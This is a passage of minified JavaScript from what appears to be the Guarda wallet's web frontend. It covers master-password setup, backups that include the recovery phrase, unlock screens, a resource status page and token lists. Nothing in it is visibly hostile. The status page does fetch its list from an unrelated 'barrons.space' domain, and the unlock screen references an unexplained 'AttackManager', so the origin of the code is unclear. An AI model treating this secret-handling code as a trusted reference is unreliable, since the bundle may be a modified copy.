        const k0 = "set-password_centerContainer_3iKnl app_centerContainer_1VI1M";
        function AppPageSetPassword() {
            const e = (0,
            $.v9)($c)
              , t = (0,
            $.I0)()
              , a = (0,
            j.k6)()
              , n = (0,
            $.v9)(Vc)
              , [r,l] = (0,
            O.useState)("")
              , [s,i] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                e.length || a.replace("/app")
            }
            ), []);
            const handleStart = async e => {
                l(e);
                i(!0)
            }
              , handleDownloadAndContinue = async () => {
                const l = {
                    password: r,
                    data: {
                        uuid: Bf()(e.reduce(( (e, t) => e + t.address), "")).toString(),
                        wallets: e.map((e => e.mapToPlainObject()))
                    }
                };
                if (n) {
                    const e = await generateBackupIdFromMnemonic(n);
                    Object.assign(l, {
                        ...l,
                        data: {
                            mnemonic: n,
                            ...l.data,
                            uuid: e,
                            [Ze]: 62
                        }
                    })
                }
                t(ie.replaceStorage(l));
                t(ie.setMasterPassword({
                    masterPassword: r
                }));
                if (n) {
                    cc.$.send(cc.d.WALLETS_IMPORT_BY_MNEMONIC);
                    i(!0)
                }
                t(handleDownload(Sm.FORCE));
                t(removeNotifyBackup());
                t(rd.setWalletsMnemonic(""));
                a.replace("/app")
            }
            ;
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-6 col-xs-offset-3"
            }, O.createElement("div", {
                className: k0
            }, s ? O.createElement(O.Fragment, null, O.createElement(white_block, {
                className: Fq
            }, O.createElement("h3", null, "Backup is the key to your funds"), O.createElement("p", null, "Please save your backup file and keep it properly as well as password. It ensures access to your funds."), O.createElement("ul", null, O.createElement("li", null, O.createElement("span", null, "Access to the wallet is possible only using both password and backup file.")), O.createElement("li", null, O.createElement("span", null, "Guarda does not keep nor able to restore your backup and password. Only you have access to your wallet.")), O.createElement("li", null, O.createElement("span", null, "Never share it with anyone."))), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleDownloadAndContinue,
                className: Bq,
                id: "creationDownloadBackup"
            }, "Download Backup"))) : O.createElement(SetPasswordComponent, {
                onSetPassword: handleStart
            })))))
        }
        const S0 = "main_wrapper_3z-I1 app_wrapperBlock_2EpA3"
          , C0 = "main_wrapperBlock_3EUbt"
          , N0 = "main_tipText_3cDx1"
          , T0 = "main_wrapperList_3tcRP"
          , A0 = "main_block_F-iRf"
          , x0 = "main_legend_3ECHc"
          , I0 = "main_label_2MuYU"
          , P0 = "main_status_69TwU"
          , L0 = "main_ticker_3qmAO"
          , F0 = "main_isWarning_19gmL"
          , W0 = "main_isError_1UDHe";
        let R0 = !1;
        function StatusResources() {
            const [e,t] = (0,
            O.useState)([]);
            function setResource(a) {
                const n = [...e]
                  , r = e.find((e => e.url === a.url))
                  , l = undefined;
                n[e.indexOf(r)] = a;
                t(n)
            }
            (0,
            O.useEffect)(( () => {
                async function startApp() {
                    const {data: e} = await Jf().get("https://wallet.barrons.space/api/v1/internal/resources-list");
                    t(e.response)
                }
                startApp()
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                if (!R0 && e.length) {
                    R0 = !0;
                    e.forEach((e => {
                        const t = new Date;
                        Jf().get(e.url, {
                            validateStatus: e => e < 500
                        }).then(( () => {
                            e.status = !0;
                            e.duration = new Date - t;
                            setResource(e)
                        }
                        )).catch((a => {
                            e.status = !1;
                            e.duration = new Date - t;
                            e.error = a.message;
                            setResource(e)
                        }
                        ))
                    }
                    ))
                }
            }
            ), [e]);
            if (!M.CM)
                return null;
            const a = e.filter((e => !1 === e.status)).length
              , isError = e => !e.status;
            return O.createElement("div", {
                className: S0
            }, O.createElement("div", {
                className: C0
            }, O.createElement(label, null, "Guarda Current Status"), O.createElement("p", {
                className: N0
            }, "Live status updates of supported cryptocurrencies. For your convenience, you can check the full functionality of all Guarda Wallet assets here."), O.createElement("div", {
                className: T0
            }, O.createElement("div", {
                className: x0
            }, O.createElement("div", {
                className: Ht()(I0, L0)
            }, "Stability - ", (100 - a / e.length * 100).toFixed(0), "%"), O.createElement("div", {
                className: I0
            }, "Status"), O.createElement("div", {
                className: I0
            }, "Response Time"), O.createElement("div", {
                className: I0
            }, "Message")), e.map((e => O.createElement(O.Fragment, {
                key: `block${e.url}`
            }, O.createElement("div", {
                className: A0
            }, O.createElement("div", {
                className: L0
            }, O.createElement("span", null, O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: e.url
            }, e.url))), O.createElement("div", {
                className: P0
            }, void 0 === e.status ? O.createElement(LoaderDots, {
                visible: !0
            }) : O.createElement("span", {
                className: Ht()({
                    [W0]: isError(e)
                })
            })), O.createElement("div", {
                className: P0
            }, e.duration ? `${e.duration}ms` : ""), O.createElement("div", {
                className: P0
            }, e.error))))))))
        }
        function StatusResourcesRoot() {
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement(j.rs, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/status-resources",
                component: StatusResources
            })))))
        }
        const B0 = a.p + "5980fb05dadb39cc26354105554acbf3.svg"
          , O0 = "popup-session-timeout_popupSessionTimeout_3Q36y"
          , D0 = undefined
          , popup_session_timeout = e => O.createElement(aa, {
            visible: e.isVisible,
            onClose: e.onClose,
            width: 412
        }, O.createElement("div", {
            className: O0
        }, O.createElement("h2", null, "Session timed out"), O.createElement("p", null, "You have been logged out due to inactivity"), O.createElement("img", {
            src: B0,
            alt: ""
        }), O.createElement(Yl, {
            color: "blue",
            onClick: e.onClose
        }, "Ok, thanks")))
          , M0 = a.p + "80d6ed8d7f8c1b89d186db0762f5a49b.svg"
          , U0 = "popup-confirm_popupCenterData_wvCrX"
          , G0 = "popup-confirm_popupContent_3qJL_"
          , V0 = "popup-confirm_atentionText_2JiPv"
          , K0 = "popup-confirm_buttonDownload_2Br64"
          , H0 = "popup-confirm_iconBackupWrapper_1sg2O"
          , z0 = undefined
          , popup_confirm = e => {
            let {isVisible: t, onClose: a, onSuccess: n} = e;
            const [r,l] = (0,
            O.useState)(!0);
            (0,
            O.useEffect)(( () => {
                let e;
                t && (e = window.setTimeout(( () => l(!1)), 1e3));
                return () => window.clearTimeout(e)
            }
            ), [t]);
            const handleClose = () => {
                l(!0);
                a()
            }
            ;
            return O.createElement(aa, {
                visible: t,
                width: 430,
                onClose: handleClose
            }, O.createElement("div", {
                className: G0
            }, O.createElement("div", {
                className: U0
            }, O.createElement("p", {
                className: V0
            }, "To create a new wallet, we will clear your browser cache. You will be logged out from your current wallet, but can restore it anytime with a backup or your recovery phrase. We download a backup file automatically before clearing cache."), O.createElement("div", {
                className: H0
            }, O.createElement("img", {
                src: M0,
                alt: ""
            })), O.createElement(Yl, {
                disabled: r,
                color: "red",
                className: K0,
                onClick: n,
                "data-test-name": "clear-cache"
            }, "Clear Cache"))))
        }
          , j0 = {
            isErrorInput: "enter-password_isErrorInput_1307w",
            buttonsWrapper: "enter-password_buttonsWrapper_2J5-Z",
            buttomWrapper: "enter-password_buttomWrapper_3UVCp",
            errorMasterPassword: "enter-password_errorMasterPassword_DB8IV",
            loader: "enter-password_loader_3FJmb",
            main: "enter-password_main_1cokJ welcom-body-electrom_main_3vkSi",
            mainLogo: "enter-password_mainLogo_2Q0oj welcom-body-electrom_mainLogo_D7Ce0",
            inputLegend: "enter-password_inputLegend_1OfVI",
            inputElectron: "enter-password_inputElectron_rTOSt",
            showPassIconWhite: "enter-password_showPassIconWhite_21DF1",
            hidePassIconWhite: "enter-password_hidePassIconWhite_21gGl",
            rightIcon: "enter-password_rightIcon_1Tfn-",
            forgotPassword: "enter-password_forgotPassword_1FcfC",
            buttonUnlock: "enter-password_buttonUnlock_12Ehi",
            secureNote: "enter-password_secureNote_1FhMU",
            bottomBtnsElectron: "enter-password_bottomBtnsElectron_3JmnX welcom-body-electrom_info_1nMFP",
            iconCreateWallet: "enter-password_iconCreateWallet_1xHIP",
            iconImportWallet: "enter-password_iconImportWallet_1D56B"
        };
        function AppPageEnterPassword(e) {
            let {onEnter: t} = e;
            const [a,n] = (0,
            O.useState)(!1)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)(!1)
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)(!1)
              , h = useLocationSearch()
              , g = (0,
            j.k6)()
              , y = (0,
            j.TH)()
              , v = AttackManager.isDirty()
              , _ = (0,
            $.I0)()
              , w = (0,
            O.useRef)(null)
              , b = (0,
            $.v9)(oe.ID);
            (0,
            O.useEffect)(( () => {
                "session-timeout" === b && n(!0)
            }
            ), [b]);
            const handleEnter = async e => {
                if (e) {
                    e.preventDefault();
                    e.stopPropagation()
                }
                i(!0);
                const a = await _(checkMasterPassword(m));
                i(!1);
                if (!a) {
                    var n;
                    c(!0);
                    p("");
                    setTimeout(( () => c(!1)), 2e3);
                    null === (n = w.current) || void 0 === n || n.focus();
                    return
                }
                const r = await _(restoreStorage(m));
                if (r) {
                    await _(restoreWallets(r.wallets));
                    await _(ie.setMasterPassword({
                        masterPassword: m
                    }));
                    cc.$.send(cc.d.USER_LOGIN);
                    t && t(r.wallets);
                    if (h.redirectUri) {
                        const e = decodeURIComponent(h.redirectUri || "")
                          , t = decodeURIComponent(h.searchUri || "");
                        g.replace({
                            pathname: e || (0,
                            M.RU)(),
                            search: t || y.search
                        })
                    }
                }
            }
              , handleRemoveAllData = async () => {
                await _(handleDownload(Sm.FORCE));
                g.replace((0,
                M.RU)());
                await _(clearSecureStorage());
                cc.$.send(cc.d.WALLET_REMOVE_FULL)
            }
              , k = O.useCallback(( () => {
                d(!0)
            }
            ), [])
              , S = O.useCallback(( () => {
                d(!1)
            }
            ), []);
            function handleGlobalKeyDown() {
                if (!u) {
                    var e;
                    null === (e = w.current) || void 0 === e || e.focus()
                }
            }
            (0,
            O.useEffect)(( () => {
                document.addEventListener("keydown", handleGlobalKeyDown);
                return () => {
                    document.removeEventListener("keydown", handleGlobalKeyDown)
                }
            }
            ), []);
            if ((0,
            M.d)())
                return O.createElement(vY, null, O.createElement(popup_session_timeout, {
                    isVisible: a,
                    onClose: () => n(!1)
                }), O.createElement(popup_confirm, {
                    isVisible: r,
                    onClose: () => l(!1),
                    onSuccess: handleRemoveAllData
                }), O.createElement("div", {
                    className: j0.main
                }, O.createElement("div", {
                    className: j0.mainLogo
                }, O.createElement(Y.OL, {
                    to: "/app"
                }, O.createElement("img", {
                    src: dY,
                    alt: "logo"
                }))), O.createElement("form", null, O.createElement("legend", {
                    className: j0.inputLegend
                }, "Password"), O.createElement(Ea, {
                    type: f ? "text" : "password",
                    autoFocus: !a,
                    ref: w,
                    value: m,
                    onBlur: S,
                    onFocus: k,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return p(t)
                    }
                    ,
                    placeholder: "Enter password",
                    autoComplete: "off",
                    onEnter: handleEnter,
                    className: Ht()(j0.inputElectron, {
                        [j0.isErrorInput]: o
                    })
                }), O.createElement("span", {
                    onClick: () => E((e => !e)),
                    className: Ht()(j0.icon, !f && j0.showPassIconWhite, f && j0.hidePassIconWhite, j0.rightIcon)
                })), O.createElement("div", {
                    className: j0.forgotPassword
                }, O.createElement("a", {
                    href: "https://support.guarda.com/troubleshooting/what-if-i-forget-my-password-i-see-a-message-saying-that-my-password-is-invalid",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, "Forgot your password?")), O.createElement("div", {
                    className: j0.buttonsWrapper
                }, o ? O.createElement("div", {
                    className: j0.errorMasterPassword
                }, "Password is invalid") : O.createElement(secure_note, {
                    className: j0.secureNote,
                    color: "white"
                }), O.createElement(Yl, {
                    color: "white",
                    className: j0.buttonUnlock,
                    size: "big",
                    onClick: handleEnter,
                    isLoading: s
                }, "Unlock")), v && O.createElement("div", null, O.createElement("br", null), O.createElement("br", null), O.createElement(_m, {
                    currency: "btc"
                }))), O.createElement("ul", {
                    className: j0.bottomBtnsElectron
                }, O.createElement("li", null, O.createElement("a", {
                    href: "#",
                    onClick: () => l(!0)
                }, O.createElement("span", {
                    className: j0.iconCreateWallet
                }), "Create new wallet")), O.createElement("li", null, O.createElement("a", {
                    href: "https://support.guarda.com/security/how-to-import-a-wallet-with-its-private-key",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, O.createElement("span", {
                    className: j0.iconImportWallet
                }), "Import wallet"))));
            const popupSessionTimeoutOnClose = () => {
                n(!1);
                window.location.reload()
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement(popup_session_timeout, {
                isVisible: a,
                onClose: popupSessionTimeoutOnClose
            }), O.createElement(popup_confirm, {
                isVisible: r,
                onClose: () => l(!1),
                onSuccess: handleRemoveAllData
            }), O.createElement(white_block, null, O.createElement("h3", null, "Welcome back!"), O.createElement("p", null, "Unlock your Guarda Wallet with your password."), O.createElement("form", null, O.createElement(Ea, {
                type: "password",
                autoFocus: !a,
                ref: w,
                value: m,
                onBlur: S,
                onFocus: k,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return p(t)
                }
                ,
                placeholder: "Password",
                autoComplete: "off",
                onEnter: handleEnter,
                className: Ht()(j0.input, {
                    [j0.isErrorInput]: o
                }),
                "data-test-name": "password"
            })), O.createElement("div", {
                className: j0.buttonsWrapper
            }, o ? O.createElement("div", {
                className: j0.errorMasterPassword
            }, "Password is invalid") : O.createElement(secure_note, null), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleEnter,
                isLoading: s,
                "data-test-name": "unlock"
            }, "Unlock")), v && O.createElement("div", null, O.createElement("br", null), O.createElement("br", null), O.createElement(_m, {
                currency: "btc"
            }))), O.createElement(gray_block, null, O.createElement("ul", null, O.createElement("li", null, O.createElement("a", {
                href: "https://support.guarda.com/troubleshooting/what-if-i-forget-my-password-i-see-a-message-saying-that-my-password-is-invalid",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Forgot your password?")), O.createElement("li", null, O.createElement("a", {
                href: "#",
                onClick: () => l(!0),
                "data-test-name": "create-new-wallet"
            }, "Want to create a new wallet?")), O.createElement("li", null, O.createElement("a", {
                href: "https://support.guarda.com/security/how-to-import-a-wallet-with-its-private-key",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Want to import any other wallet here?")))))
        }
        const $0 = "enter-password_centerContainer_1vzHI app_centerContainer_1VI1M";
        function EnterPasswordPage() {
            return O.createElement("div", {
                className: "container",
                "data-test-name": "enter-password"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-6 col-xs-offset-3"
            }, O.createElement("div", {
                className: $0
            }, O.createElement(AppPageEnterPassword, null)))))
        }
        const Z0 = "supported-currencies_wrapper_3SRUQ app_wrapperBlock_2EpA3"
          , Y0 = "supported-currencies_wrapperBlock_2j_gH"
          , q0 = "supported-currencies_blockCurrency_3sgbI"
          , X0 = "supported-currencies_ticker_kbeIO";
        function SupportedCurrenciesMain() {
            const e = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate)).sort(( (e, t) => {
                var a, n, r, l;
                return (null !== (a = null === (n = (0,
                be.II)(e)) || void 0 === n ? void 0 : n.title) && void 0 !== a ? a : "") > (null !== (r = null === (l = (0,
                be.II)(t)) || void 0 === l ? void 0 : l.title) && void 0 !== r ? r : "") ? 1 : -1
            }
            ));
            return O.createElement("div", {
                className: Z0
            }, O.createElement(menu_settings, null), O.createElement("div", {
                className: Y0
            }, O.createElement(label, null, "Supported Coins - ", e.length), e.map((e => {
                var t;
                return O.createElement("div", {
                    className: q0,
                    key: `commoncurrencylist${e}`
                }, O.createElement(IconCurrency, {
                    currency: e,
                    className: X0
                }), O.createElement("span", null, null === (t = (0,
                be.II)(e)) || void 0 === t ? void 0 : t.title))
            }
            ))))
        }
        var Q0 = a(55836)
          , J0 = a(62035)
          , e1 = a(57330);
        const t1 = "token-list_blockCurrency_7aGdS";
        function TokenList(e) {
            let {tokensList: t, tokensName: a} = e;
            const n = {
                collectible: "ERC-721",
                trx: "TRC-10",
                eth: "ERC-20",
                bnb: "BEP-2",
                eos: "",
                etc: "ERC-20",
                waves: "Waves-NG",
                neo: "NEP-5",
                ont: "OEP",
                btc: "OMNI",
                vet: "VIP-191"
            };
            return O.createElement(O.Fragment, null, !!t.length && O.createElement(label, null, "Supported ", a.toUpperCase(), " Tokens ", n[a] ? `(${n[a]})` : null), !!t.length && t.map((e => "string" == typeof e ? O.createElement("div", {
                className: t1,
                key: `${a}${e}`
            }, O.createElement("span", null, e)) : O.createElement("div", {
                className: t1,
                key: `${a}${e._id}`
            }, O.createElement("span", null, e.title || e.currency.toUpperCase())))), O.createElement("br", null), O.createElement("br", null))
        }
        const a1 = TokenList
          , n1 = ["Guarda", "Cryptokitties", "Blockchain Cuties", "0x universe", "Gods Unchained"];
        function SupportedCurrenciesTokens() {
            const [e,t] = (0,
            O.useState)(!0)
              , [a,n] = (0,
            O.useState)({});
            (0,
            O.useEffect)(( () => {
                let e = !1;
                async function fetchTokens() {
                    const {data: a} = await bc.w.get("/list/tokens");
                    if (e)
                        return;
                    let r = {};
                    for (const e of (0,
                    Q0.Z)(1024, a.response)) {
                        const t = (0,
                        J0.Z)((e => e.family), e);
                        r = (0,
                        wc.Z)(e1.Z, r, t);
                        await new Promise((e => setTimeout(e, 100)))
                    }
                    n(r);
                    t(!1)
                }
                fetchTokens();
                return () => {
                    e = !0
                }
            }
            ), []);
            const r = Object.keys(a);
            return O.createElement("div", {
                className: Z0
            }, O.createElement(menu_settings, null), O.createElement("div", {
                className: Y0
            }, !!n1 && O.createElement(a1, {
                key: "collectible",
                tokensList: n1,
                tokensName: "collectible"
            }), e && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("br", null), O.createElement(loader, {
                visible: !0,
                width: 48
            })), !!r && r.map((e => O.createElement(a1, {
                key: e,
                tokensList: a[e],
                tokensName: e
            })))))
        }
        function SupportedCurrenciesRoot() {
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-4 electron-left-column"
            }, O.createElement(TX, null, O.createElement(title, null, "About"), O.createElement(body, null, "This is a complete list of coins and tokens that are supported by Guarda Wallet. Let us know if you did not find the currency you are looking for. We'll add it to the list after intensive check."))), O.createElement("div", {
                className: "col-xs-8 electron-right-column"
            }, O.createElement(j.rs, null, O.createElement(j.AW, {
                exact: !0,
                path: "/app/supported-currencies",
                component: SupportedCurrenciesMain
            }), O.createElement(j.AW, {
                exact: !0,
                path: "/app/supported-currencies/tokens",
                component: SupportedCurrenciesTokens
            })))))
        }
        const r1 = a.p + "e76f75e14d2fcd41c608e6292791a9fc.svg"
          , l1 = "wallet-export-csv_container_-mKcp"
          , s1 = "wallet-export-csv_label_1OQ9d"
          , i1 = "wallet-export-csv_image_3Hsbq";
        function cleanString(e) {
            return e ? String(e).replace(/[^a-zA-Z0-9_\-.,]/g, "") : ""
        }
        const WalletExportCSV_WalletExportCSV = e => {
            let {walletsList: t} = e;
            const {convertToFiat: a} = useConverter();
            function handleExport() {
                cc.$.send(cc.d.CSV_DOWNLOAD_CLICK);
                let e = "data:text/csv;charset=utf-8,";
                const n = ["ticker", "name", "amount", "amount-converted"].join(",");
                e += `${n}\r\n`;
                const r = new Set;
                t.forEach((t => {
                    const n = [t.currency, t.title, t.balance, a(t.balance, t)].map(cleanString).join(",");
                    if (!r.has(n)) {
                        e += `${n}\r\n`;
                        r.add(n)
                    }
                    t.subWallets && t.subWallets.forEach((t => {
                        const n = [t.currency, t.title, t.balance, a(t.balance, t)].map(cleanString).join(",");
                        if (!r.has(n)) {
                            e += `${n}\r\n`;
                            r.add(n)
                        }
                    }
                    ))
                }
                ));
                const l = encodeURI(e)
                  , s = document.createElement("a");
                s.setAttribute("href", l);
                s.setAttribute("download", `wallet-export-${date_format(new Date, "dd-mm-yyyy")}.csv`);
                document.body.appendChild(s);
                s.click()
            }
            return O.createElement("div", {
                className: l1,
                onClick: handleExport
            }, O.createElement("div", {
                className: s1
            }, "Export balances"), O.createElement("img", {
                src: r1,
                alt: "CSV",
                className: i1
            }))
        }
          , o1 = a.p + "5de602f6190c1e46071c1643f95b292b.svg"
          , c1 = a.p + "ca31ac5e01bba6680bab99310dca0ec0.svg"
          , u1 = {
            centerContainer: "wallet-management_centerContainer_qeN7A",
            walletContainer: "wallet-management_walletContainer_1upI2",
            flex: "wallet-management_flex_otVv7",
            walletBlock: "wallet-management_walletBlock_3ZC7H",
            walletBlockWrap: "wallet-management_walletBlockWrap_1sLqh",
            iconWrapper: "wallet-management_iconWrapper_100vh",
            blockLabel: "wallet-management_blockLabel_2eJvE",
            infoWrapper: "wallet-management_infoWrapper_2Y5aC",
            walletInfo: "wallet-management_walletInfo_35m-L",
            walletTitle: "wallet-management_walletTitle_1JlGs",
            hiddenTitle: "wallet-management_hiddenTitle_1_yZA",
            walletTicker: "wallet-management_walletTicker_3llhQ",
            walletBalance: "wallet-management_walletBalance_3z3Ui",
            buttonsWrapper: "wallet-management_buttonsWrapper_1cNF6",
            buttonSpace: "wallet-management_buttonSpace_-_dgw",
            button: "wallet-management_button_-2jTZ",
            activeButton: "wallet-management_activeButton_36kLf",
            searchWrapper: "wallet-management_searchWrapper_2NBmd",
            searchBlock: "wallet-management_searchBlock_2gm_y",
            glassIcon: "wallet-management_glassIcon_3QoxY",
            back: "wallet-management_back_1p-Jl",
            iconArrow: "wallet-management_iconArrow_2Smuh",
            head: "wallet-management_head_ux8kM",
            panelWrapper: "wallet-management_panelWrapper_2B75p",
            panelItem: "wallet-management_panelItem_2F59l",
            filtersWrapper: "wallet-management_filtersWrapper_F0DWy",
            filtersItem: "wallet-management_filtersItem_FdTTV",
            filtersItemChosen: "wallet-management_filtersItemChosen_3_5ws",
            blockImage: "wallet-management_blockImage_1mh0z",
            emptyState: "wallet-management_emptyState_9-vnN",
            empty: "wallet-management_empty_2oTRU",
            counter: "wallet-management_counter_3M3sU",
            noPadding: "wallet-management_noPadding_2tZTB",
            flexContainer: "wallet-management_flexContainer_BhE-g",
            showMoreButton: "wallet-management_showMoreButton_1s5ve",
            iconArrowShow: "wallet-management_iconArrowShow_2p_N_"
        };
        function button_Button(e) {
            let {text: t, onClick: a, active: n} = e;
            return O.createElement("div", {
                onClick: a,
                className: n ? u1.activeButton : u1.button
            }, t)
        }
        button_Button.propTypes = {
            text: as().string,
            onClick: as().func,
            active: as().bool
        };
        const d1 = button_Button
          , m1 = "rename_wrapper_3w-9R"
          , p1 = "rename_titleWrapper_3Dofk"
          , f1 = "rename_input_-meZK"
          , E1 = "rename_inputTitle_1JsF6"
          , h1 = "rename_hidden_3auCV"
          , g1 = "rename_isHidden_31Lq4"
          , y1 = "rename_walletBalance_3vzQc"
          , v1 = "rename_walletInfo_lTPEU"
          , _1 = "rename_walletTitle_2iAfV"
          , w1 = "rename_hiddenTitle_1G4IB"
          , b1 = "rename_walletTicker_3Hmd5"
          , k1 = "rename_walletTitleWrap_3j9hC";
        function rename_WalletTitle(e) {
            const {wallet: t} = e
              , a = (0,
            $.I0)()
              , n = (0,
            $.v9)(_s)
              , r = n.indexOf(t.uuid) > -1
              , [l,s] = (0,
            O.useState)(t.title)
              , i = O.createRef()
              , o = `${(0,
            be.xG)(t.currency)} wallet`
              , [c,u] = (0,
            O.useState)(null)
              , [d,m] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                s(t.title)
            }
            ), [null == t ? void 0 : t.uuid]);
            function handleChangeTitle(e) {
                let {target: {value: t}} = e;
                const a = (0,
                ve.Z)(t);
                s(a)
            }
            async function handleSave(e) {
                if (t.title !== l) {
                    t.title = l;
                    a(rd.updateWallet({
                        wallet: t
                    }))
                }
                u(null);
                m(!1);
                e && e.stopPropagation()
            }
            function handleStartEditable(e) {
                const a = t.clone();
                u(a);
                m(!0);
                e && e.stopPropagation()
            }
            (0,
            O.useEffect)(( () => {
                d && i.current.focus()
            }
            ), [d]);
            function handleOnKeyDown(e) {
                let {keyCode: t} = e;
                13 === t && handleSave();
                if (27 === t) {
                    u(null);
                    m(!1)
                }
            }
            return O.createElement("div", {
                className: n.indexOf(t.uuid) > -1 ? w1 : _1
            }, O.createElement("div", {
                className: v1
            }, d && c ? O.createElement("div", {
                className: Ht()(m1, {
                    [g1]: r
                })
            }, O.createElement("input", {
                ref: i,
                maxLength: 35,
                value: l,
                placeholder: o,
                onChange: handleChangeTitle,
                onKeyDown: handleOnKeyDown,
                className: f1,
                spellCheck: !1
            })) : O.createElement("div", {
                className: k1,
                onClick: handleStartEditable
            }, t.title || o, " ", O.createElement("span", {
                className: b1
            }, t.currency.toUpperCase())), O.createElement("div", {
                className: y1
            }, (0,
            Ko.i1)(t.balance), " ", t.hw && O.createElement("span", null, t.hw), t.watchOnly && O.createElement("span", null, "WO"))), O.createElement("div", {
                className: h1,
                id: "hidden-text"
            }, l || o), d ? O.createElement(d1, {
                text: "Apply",
                onClick: handleSave,
                active: !0
            }) : O.createElement(d1, {
                text: "Rename",
                onClick: handleStartEditable
            }))
        }
        rename_WalletTitle.propTypes = {
            wallet: as().object.isRequired
        };
        const S1 = a.p + "a3ae9e660b1186d60f8d4baacc2b1d3e.svg"
          , C1 = ["hbar"];
        function PopupButtons(e) {
            let {ticker: t, isMultisig: a, isToken: n, parentWallet: r, token: l} = e;
            const s = usePopup()
              , [i,o] = (0,
            O.useState)(!0);
            function openPopupCreate(e, c) {
                if ("eos" === c && "create" === e) {
                    s.open("create-eos");
                    return
                }
                const u = {
                    initialTab: e,
                    currency: c,
                    withoutMenu: !0,
                    isForceCreate: !C1.includes(null != c ? c : "")
                };
                n && l && r ? s.open("create-token", {
                    token: l,
                    parentWallet: r,
                    unclosable: i,
                    onChangeUnclosable: o
                }) : a ? s.open("create-multisig", {
                    newWallet: t
                }) : s.open("import-or-create", u)
            }
            const c = ["ltc", "btc", "eth", "etc", "clo", "bnb"]
              , u = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveImport && e.isActiveWatchOnly))
              , d = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveImport));
            return O.createElement("div", {
                className: u1.buttonsWrapper
            }, O.createElement("div", {
                className: u1.buttonSpace
            }, O.createElement(d1, {
                text: "Create",
                onClick: () => openPopupCreate("create", t)
            })), O.createElement("div", {
                className: u1.buttonSpace
            }, !n && !a && d.includes(null != t ? t : "") && O.createElement(d1, {
                text: "Import",
                onClick: () => openPopupCreate("import", t)
            })), O.createElement("div", {
                className: u1.buttonSpace
            }, !n && !a && u.includes(null != t ? t : "") && O.createElement(d1, {
                text: "Watch only",
                onClick: () => openPopupCreate("watch", t)
            })), O.createElement("div", {
                className: u1.buttonSpace
            }, !n && !a && c.includes(null != t ? t : "") && O.createElement(d1, {
                text: "Ledger",
                onClick: () => openPopupCreate("ledger", t)
            })))
        }
        const N1 = PopupButtons
          , T1 = undefined
          , add_multisig_block = e => {
            let {listOfMultisigs: t} = e;
            return O.createElement("div", {
                className: u1.walletContainer
            }, 0 !== t.length && O.createElement("div", {
                className: Ht()(u1.wrapper, u1.wrapperWalletsAndTokens)
            }, t.map((e => {
                var t;
                return O.createElement("div", {
                    className: u1.walletBlockWrap,
                    key: `privatekey${e.ticker}`
                }, O.createElement("div", {
                    className: u1.walletBlock
                }, O.createElement("div", {
                    className: u1.iconWrapper
                }, O.createElement(IconCurrency, {
                    currency: e.ticker,
                    className: u1.ticker,
                    key: `availableWallet${e.ticker}`
                })), O.createElement("div", {
                    className: u1.infoWrapper
                }, O.createElement("div", {
                    className: u1.walletInfo
                }, O.createElement("div", {
                    className: u1.walletTitle
                }, e.title, " ", O.createElement("span", {
                    className: u1.walletTicker
                }, null == e || null === (t = e.ticker) || void 0 === t ? void 0 : t.toUpperCase()))), O.createElement(N1, {
                    ticker: e.ticker,
                    isMultisig: !0
                }))))
            }
            ))))
        }
          , A1 = 10
          , x1 = 10
          , I1 = undefined
          , add_coins_block = e => {
            let {listOfCurrencies: t} = e;
            const [a,n] = (0,
            O.useState)(A1)
              , r = (0,
            O.useMemo)(( () => null == t ? void 0 : t.slice(0, a)), [t, a]);
            return O.createElement("div", {
                className: u1.walletContainer
            }, !!t.length && O.createElement("div", {
                className: Ht()(u1.wrapper, u1.wrapperWalletsAndTokens)
            }, r.map((e => {
                var t;
                return O.createElement("div", {
                    className: u1.walletBlockWrap,
                    key: `privatekey${e.ticker}`
                }, O.createElement("div", {
                    className: u1.walletBlock
                }, O.createElement("div", {
                    className: u1.iconWrapper
                }, O.createElement(IconCurrency, {
                    currency: e.ticker,
                    className: u1.ticker,
                    key: `availableWallet${e.ticker}`
                })), O.createElement("div", {
                    className: u1.infoWrapper
                }, O.createElement("div", {
                    className: u1.walletInfo
                }, O.createElement("div", {
                    className: u1.walletTitle
                }, e.title, " ", O.createElement("span", {
                    className: u1.walletTicker
                }, null == e || null === (t = e.ticker) || void 0 === t ? void 0 : t.toUpperCase()))), O.createElement(N1, {
                    ticker: e.ticker
                }))))
            }
            )), t.length - r.length > 0 && O.createElement("div", {
                className: u1.showMoreButton,
                onClick: () => n((e => e + x1))
            }, O.createElement("img", {
                src: uS,
                width: "24px",
                height: "24px",
                className: u1.iconArrowShow,
                alt: "show more"
            }), "Show more")))
        }
          , P1 = undefined
          , new_token_block = e => {
            var t;
            let {token: a} = e;
            const n = (0,
            $.v9)($c)
              , [r,l] = (0,
            O.useState)(null);
            return O.createElement("div", {
                className: u1.walletBlock
            }, O.createElement("div", {
                className: u1.iconWrapper
            }, O.createElement(IconCurrency, {
                currency: a.ticker,
                className: u1.ticker,
                key: `availableWallet${a.ticker}`
            })), O.createElement("div", {
                className: u1.infoWrapper
